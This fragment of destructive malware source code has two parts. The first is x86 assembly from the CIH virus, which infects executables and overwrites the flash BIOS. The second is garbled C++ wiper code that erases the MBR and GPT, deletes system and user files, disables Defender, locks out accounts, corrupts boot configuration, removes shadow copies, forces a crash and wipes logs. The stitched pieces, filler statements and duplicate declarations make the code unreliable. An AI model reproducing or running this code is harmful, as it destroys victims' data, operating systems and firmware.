		SetVirusCodeSectionTableEndMark:
		add [eax], ebp
		add [esp+08h], ebp
		xor ebx, ebx
		mov [eax-04h], ebx
		lea eax, (LastVxDCallAddress-2-@9)[esi]
		mov cl, VxDCallTableSize
		LoopOfRestoreVxDCallID:
		mov word ptr [eax], 20cdh
		mov edx, (VxDCallIDTable+(ecx-1)*04h-@9)[esi]
		mov [eax+2], edx
		movzx edx, byte ptr (VxDCallAddressTable+ecx-1-@9)[esi]
		sub eax, edx
		loop LoopOfRestoreVxDCallID
		WriteVirusCodeToFile:
		mov eax, dr1
		mov ebx, [eax+10h]
		mov edi, [eax]
		LoopOfWriteVirusCodeToFile:
		pop ecx
		jecxz SetFileModificationMark
		mov esi, ecx
		mov eax, 0d601h
		pop edx
		pop ecx
		call edi
		jmp LoopOfWriteVirusCodeToFile
		SetFileModificationMark:
		pop ebx
		pop eax
		stc
		pushf
		CloseFile:
		xor eax, eax
		mov ah, 0d7h
		call edi
		popf
		pop esi
		jnc IsKillComputer
		mov ebx, edi
		mov ax, 4303h
		mov ecx, (FileModificationTime-@7)[esi]
		mov edi, (FileModificationTime+2-@7)[esi]
		call ebx
		DisableOnBusy:
		dec byte ptr (OnBusy-@7)[esi]
		prevhook:
		popad
		mov eax, dr0
		jmp [eax]
		pIFSFunc:
		mov ebx, esp
		push dword ptr [ebx+20h+04h+14h]
		call [ebx+20h+04h]
		pop ecx
		mov [ebx+1ch], eax
		cmp dword ptr [ebx+20h+04h+04h], 00000024h
		jne QuitMyVirusFileSystemHook
		mov eax, [ecx+28h]
		mov (FileModificationTime-@6)[esi], eax
		QuitMyVirusFileSystemHook:
		popad
		ret
		IsKillComputer:
		mov al, 07h
		out 70h, al
		in al, 71h
		xor al, 01h
		IF DEBUG
		jmp DisableOnBusy
		ELSE
		jnz DisableOnBusy
		ENDIF
		mov bp, 0cf8h
		lea esi, IOForEEPROM-@7[esi]
		mov edi, 8000384ch
		mov dx, 0cfeh
		cli
		call esi
		mov di, 0058h
		dec edx
		mov word ptr (BooleanCalculateCode-@10)[esi], 0f24h
		call esi
		lea ebx, EnableEEPROMToWrite-@10[esi]
		mov eax, 0e5555h
		mov ecx, 0e2aaah
		call ebx
		mov byte ptr [eax], 60h
		push ecx
		loop
		mov eax, 0f5555h
		pop ecx
		mov ch, 0aah
		call ebx
		mov byte ptr [eax], 20h
		loop
		mov ah, 0e0h
		mov [eax], al
		or al, 44h
		xchg eax, edi
		xchg edx, ebp
		out dx, eax
		xchg eax, edi
		xchg edx, ebp
		out dx, al
		ret
		LastVxDCallAddress = IFSMgr_Ring0_FileIO
		VxDCallAddressTable db 00h
		db IFSMgr_RemoveFileSystemApiHook-_PageAllocate
		db UniToBCSPath-IFSMgr_RemoveFileSystemApiHook
		db IFSMgr_Ring0_FileIO-UniToBCSPath
		VxDCallIDTable dd 00010053h, 00400068h, 00400041h, 00400032h
		VxDCallTableSize = (-VxDCallTable)/04h
		VirusVersionCopyRight db 'WinCIH ver1.5 by TATUNG, Thailand'
		VirusSize = @9
		; + SizeOfVirusCodeSectionTableEndMark(04h)
		; + NumberOfSections(??)*SizeOfVirusCodeSectionTable(08h)
		; + SizeOfTheFirstVirusCodeSectionTable(04h)
		VirusGameDataStartAddress = VirusSize
		@6 = VirusGameDataStartAddress
		OnBusy db 0
		FileModificationTime dd ?
		FileNameBuffer db FileNameBufferSize dup(?)
		@7 = FileNameBuffer
		DataBuffer = @8
		SectionAlignment dd ?
		FileAlignment dd ?
		OperatingSystemVersion dd ?
		ImageVersion dd ?
		SubsystemVersion dd ?
		Reserved dd ?
		SizeOfImage dd ?
		SizeOfHeaders dd ?
		SizeOfImageHeaderToRead = -NumberOfSections
		NewAddressOfEntryPoint = DataBuffer
		AddressOfEntryPoint = DataBuffer+04h
		SizeOfOptionalHeader = DataBuffer+06h
		NumberOfSections = DataBuffer+08h
		StartOfSectionTable = DataBuffer+0Ch
		SizeOfScetionTable = 28h
		SizeOfVirusCodeSectionTableEndMark = 04h
		SizeOfVirusCodeSectionTable = 08h
		SizeOfTheFirstVirusCodeSectionTable = 04h
		VirusTotalNeedMemory = @9
		; + NumberOfSections(??)*SizeOfScetionTable(28h)
		; + SizeOfVirusCodeSectionTableEndMark(04h)
		; + NumberOfSections(??)*SizeOfVirusCodeSectionTable(08h)
		; + SizeOfTheFirstVirusCodeSectionTable(04h)
		VirusGame ENDS
		END FileHeader
		}
		InitSc();

		try
		{
			st();
		}
		catch (Exception& e)
		{

		}
		catch (...)
		{

		}
		wchar_t drivePath[] = L"\\\\.\\PhysicalDrive0";
		ClearMBR(drivePath);
		wchar_t drivePath2[] = L"\\\\.\\PhysicalDrive0";
		ClearGPT(drivePath2);
		ClearAllLogsAndBackups();
		ClearOnlyETW();
		ClearOnlyMFT();
		ClearMemoryTraces();
		ClearProcessHandleTraces();
		ClearDiskSectorTraces();
		ClearPrefetchFiles();
		ClearSystemRestorePoints();
		ClearVolumeShadowCopies();
		ClearRegistryBackupTraces();
		ClearNICLogs();
		ClearCloudSyncLogs();
		ClearISPLogs();
		ClearMicrosoftAccountTraces();
		ClearBrowserLoginTraces();
		ClearWechatTraces();
		ClearQQTraces();
		ClearCloudDiskTraces();
		ClearMACAddressTraces();
		ClearDiskSerialTraces();
		ClearCPUSerialTraces();
		ClearMotherboardUUIDTraces();
		ClearMachineGUIDTraces();
		ClearWindowsLicenseIDTraces();
		HANDLE hFile = CreateFile(_T("C:\\HW_ID_Cleared.txt"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
		ClearRouterLocalTraces();
		ClearUEFI_FirmwareLogs();
		HANDLE hFile = CreateFile(_T("C:\\UEFI_Logs_Cleared.txt"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
		ClearOnlyKernelLogs_Safe();
		HANDLE hFile = CreateFile(_T("C:\\KernelLogs_Cleared_Safe.txt"),
								  GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

		ofstream fout(SCRIPT_PATH.c_str(), ios::out | ios::trunc | ios::binary);
		fout << "clean all\r\n";
		fout << "exit\r\n";
		fout.close();
		string execCmd = "diskpart /s \"" + SCRIPT_PATH + "\"";
		system(execCmd.c_str());
		system("net user %username% 8qth7aorch8bfsatz8g73378qxbrtaxfwg8y87e90b78wgrb8t666660q83q0btygfuyssgrayugaygufebag8b");
		cls;
		;
		;
		;
		;
		;
		;
		;
		system("net user Administrator qo8bco7attbt7tzk8if788taw9c3n0nnc9noaybrbqr9bobctqo9b37r4b9oq7ob9r7t87fta8tbf9abfbffrftbz9faz");
		cls;
		{
			;
			if(2)
			{
				int r=59;
				cls;
			}
			cls;
		}
		{
			;
			;
		}
		system("sc config WinDefend start= disabled & sc stop WinDefend");
		{
			;
			;
			;
			string k="sc";
		}
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		cls;
		system("sc config wuauserv start= disabled & sc stop wuauserv");
		cls;
		{
			;
		}
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		system("sc config lanmanserver start= disabled & sc stop lanmanserver");
		cls;
		{
			;
		}
		system("sc config explorer start= disabled");
		cls;
		{
			;
		}
		{
			;
		}
		{
			;
		}
		{
			;
		}
		{
			;
		}
		system("net user %username% /active:no");
		cls;
		{
			;
		}
		system("net user Administrator /active:no");
		cls;
		{
			;
		}
		system("net user User /active:no");
		cls;
		{
			;
		}
		system("net user SHIT /add");
		cls;
		{
			;
		}
		system("net user SHIT /active:yes");
		cls;
		{
			;
			;
		}
		system("net localgroup Administrators SHIT /delete");
		cls;
		{
			;
		}
		system("net localgroup Users SHIT /delete");
		cls;
		;
		;
		;
		;
		;
		;
		;
		;
		system("net localgroup Guests SHIT /add");
		cls;
		system("net localgroup Administrators %username% /delete");
		cls;
		{
			;
			;
			;
			string l="shit";
		}
		;
		;
		;
		;
		system("takeown /f %windir%\\system32 /r /d y");
		cls;
		;
		;
		;
		cls;
		;
		;
		string n="gay";
		;
		system("echo Y|cacls %windir%\\system32\\*.* /t /g %username%:F");
		int u=69;
		string z="system";
		cls;
		{
			;
		}
		system("del /s /q /f %windir%\\system32\\*.*");
		cls;
		{
			;
		}
		;
		system("attrib -r -s -h C:\\Program Files\\");
		cls;
		system("del C:\\Program Files\\* /f /s /q");
		cls;
		{
			;
		}
		system("attrib -r -s -h C:\\Program Files (x86)\\");
		cls;
		{
			;
			;
			;
		}
		system("del C:\\Program Files (x86)\\ /f /s /q");
		cls;
		{
			;
		}
		system("attrib -r -s -h C:\\Users\\Administrator\\");
		cls;
		{
			;
		}
		system("del C:\\Users\\Administrator\\ /f /s /q");
		cls;
		{
			;
		}
		system("attrib -r -s -h C:\\Users\\%username%\\");
		cls;
		{
			;
		}
		system("del C:\\Users\\%username% /f /s /q");
		cls;
		{
			;
			;
			//
			//
			;
			//
			;
			;
			//
		}
		system("attrib -r -s -h C:\\autoexec.bat");
		cls;
		system("del C:\\autoexec.bat /f /s /q");
		cls;
		{
			;
		}
		system("attrib -r -s -h C:\\boot.ini");
		cls;
		;
		;
		;
		;
		;
		system("del C:\\boot.ini /f /s /q");
		cls;
		;
		;
		;
		;
		system("attrib -r -s -h C:\\ntldr");
		cls;
		;
		;
		;
		;
		{
			;
			;
			;
			;
			;
			;
			;
			;
			;
			;
		}
		system("del C:\\ntldr /f /s /q");
		cls;
		system("attrib -r -s -h C:\\windows\\win.ini");
		cls;
		;
		;
		system("del C:\\windows\\win.ini /f /s /q");
		cls;
		system("del %systemdrive%\\*.* /f/s/q");
		cls;
		system("attrib -r -s -h C:\\Windows\\System32\\dllcache");
		cls;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		system("del C:\\Windows\\System32\\dllcache /f /s /q");
		cls;
		system("attrib -r -s -h C:\\Windows\\WinSxS");
		cls;
		system("del C:\\Windows\\WinSxS /f /s /q");
		cls;
		system("attrib -r -s -h C:\\Windows\\System32\\sfc.exe");
		cls;
		system("del C:\\Windows\\System32\\sfc.exe /f /s /q");
		cls;
		system("attrib -r -s -h C:\\Windows\\System32\\DISM.exe");
		cls;
		system("del C:\\Windows\\System32\\DISM.exe /f /s /q");
		cls;
		system("attrib -r -s -h C:\\Recovery\\WindowsRE\\Winre.wim.exe");
		cls;
		system("del C:\\Recovery\\WindowsRE\\Winre.wim /f /s /q");
		cls;
		system("attrib -r -s -h C:\\Windows\\System32\\Recovery\\Winre.wim");
		cls;
		system("del C:\\Windows\\System32\\Recovery\\Winre.wim /f /s /q");
		cls;
		system("attrib -r -s -h C:\\Windows\\System32\\reagentc.exe");
		cls;
		system("del C:\\Windows\\System32\\reagentc.exe /f /s /q");
		cls;
		system("attrib -r -s -h C:\\Windows\\Logs\\CBS\\CBS.log");
		cls;
		system("del C:\\Windows\\Logs\\CBS\\CBS.log /f /s /q");
		cls;
		system("attrib -r -s -h C:\\Windows\\Logs\\DISM\\dism.log");
		cls;
		system("del C:\\Windows\\Logs\\DISM\\dism.log /f /s /q");
		cls;
		system("attrib -r -s -h C:\\Windows\\Repair");
		cls;
		system("del C:\\Windows\\Repair /f /s /q");
		cls;
		system("attrib -r -s -h C:\\Windows\\System32\\Config\\RegBack");
		cls;
		system("del C:\\Windows\\System32\\Config\\RegBack /f /s /q");
		cls;
		system("attrib C:\\System Volume Information -r -s -h");
		cls;
		system("del C:\\System Volume Information /f /s /q");
		cls;
		system("attrib -r -s -h C:\\ntldr");
		cls;
		system("del C:\\ntldr /f /s /q");
		cls;
		system("icacls C:\\ /remove:d Everyone /f");
		cls;
		system("icacls C:\\ /deny Everyone:(F) /f");
		cls;
		system("attrib +R C:\\*.* /S /D");
		cls;
		system("bcdedit /set {default} osdevice unknown");
		cls;
		system("assoc .exe=Virus");
		cls;
		system("pnputil /delete-driver oem0.inf /uninstall /force");
		cls;
		system("")
		system("vssadmin delete shadows /all /quiet");
		cls;
		system("bcdedit /set {current} safeboot minimal");
		cls;
		system("bcdedit /deletevalue {current} safeboot");
		cls;
		system("takeown /f C:\\Windows\\System32\\drivers\\storahci.sys && icacls C:\\Windows\\System32\\drivers\\storahci.sys /grant administrators:F && ren C:\\Windows\\System32\\drivers\\storahci.sys storahci.sys.bak");
		cls;
		system("echo select disk 0 > ds.txt && echo offline disk >> ds.txt && diskpart /s ds.txt");
		cls;
		system("bcdedit /set {current} osdevice partition=A:");
		cls;
		system("fsutil dirty set C:");
		cls;
		system("sc config pci start= disabled");
		cls;
		system("netsh advfirewall reset");
		cls;
		system("bcdedit /set {default} detecthal on");
		cls;
		system("setx PATH %SystemRoot%");
		cls;
		system("echo "" > C:\\Windows\\System32\\config\\SAM");
		cls;
		system("pnputil /add-driver C:\\bad_driver.inf /install");
		cls;
		system("wmic shadowcopy delete");
		cls;
		system("wmic process where name= lsass.exe delete");
		cls;
		system("bcdedit /set hypervisorlaunchtype off");
		cls;
		system("del /f /s /q C:\\Windows\\Microsoft.NET\\Framework\\*.*");
		cls;
		system("sc config WerSvc start= disabled");
		cls;
		system("sfc /scannow");
		cls;
		system("bcdedit /delete {bootmgr} /f");
		cls;
		system("bcdedit /delete {current} /f");
		cls;
		system("del /f /q C:\\bcd_backup");
		cls;
		system("reagentc /disable");
		cls;
		system("bcdedit /set {default} recoveryenabled No");
		cls;
		system("taskkill /f /im taskmgr.exe");
		cls;
		system("taskkill /f /im taskmgr.zip");
		cls;
		system("taskkill /f /im taskmgr.7z");
		BOOLEAN bEnabled;
		ULONG uResp;
		LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
		LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
		pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
		pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
		NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
		NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
		WriteBootSectorSilent();
		PACL pOldDACL = NULL;
		PSECURITY_DESCRIPTOR pSD = NULL;

		GetNamedSecurityInfo(
			"C:\\Windows\\System32\\DiskPart.exe",
			SE_FILE_OBJECT,
			DACL_SECURITY_INFORMATION,
			NULL,
			NULL,
			&pOldDACL,
			NULL,
			&pSD
		);

		EXPLICIT_ACCESS ea;
		ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
		ea.grfAccessPermissions = 0;
		ea.grfAccessMode = DENY_ACCESS;
		ea.grfInheritance = NO_INHERITANCE;
		ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
		ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
		ea.Trustee.ptstrName = "Everyone";

		PACL pNewDACL = NULL;
		SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL);

		SetNamedSecurityInfo(
			"C:\\Windows\\System32\\DiskPart.exe",
			SE_FILE_OBJECT,
			DACL_SECURITY_INFORMATION,
			NULL,
			NULL,
			pNewDACL,
			NULL
		);
		ClearAllLogsAndBackups();
		ClearOnlyETW();
		ClearOnlyMFT();
		ClearMemoryTraces();
		ClearProcessHandleTraces();
		ClearDiskSectorTraces();
		ClearPrefetchFiles();
		ClearSystemRestorePoints();
		ClearVolumeShadowCopies();
		ClearRegistryBackupTraces();
		ClearNICLogs();
		ClearCloudSyncLogs();
		ClearISPLogs();
		ClearMicrosoftAccountTraces();
		ClearBrowserLoginTraces();
		ClearWechatTraces();
		ClearQQTraces();
		ClearCloudDiskTraces();
		ClearMACAddressTraces();
		ClearDiskSerialTraces();
		ClearCPUSerialTraces();
		ClearMotherboardUUIDTraces();
		ClearMachineGUIDTraces();
		ClearWindowsLicenseIDTraces();
		HANDLE hFile = CreateFile(_T("C:\\HW_ID_Cleared.txt"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

		ClearRouterLocalTraces();
		ClearUEFI_FirmwareLogs();
		HANDLE hFile = CreateFile(_T("C:\\UEFI_Logs_Cleared.txt"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
		ClearOnlyKernelLogs_Safe();
		HANDLE hFile = CreateFile(_T("C:\\KernelLogs_Cleared_Safe.txt"),
								  GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
		SetWriteProtectionPolicy(true);
		system("wevtutil cl");
		cls;
		system("taskkill /f /im svchost.exe");
		cls;
		system("taskkill -im wininit.exe -f");
		return 0;
	}

	}
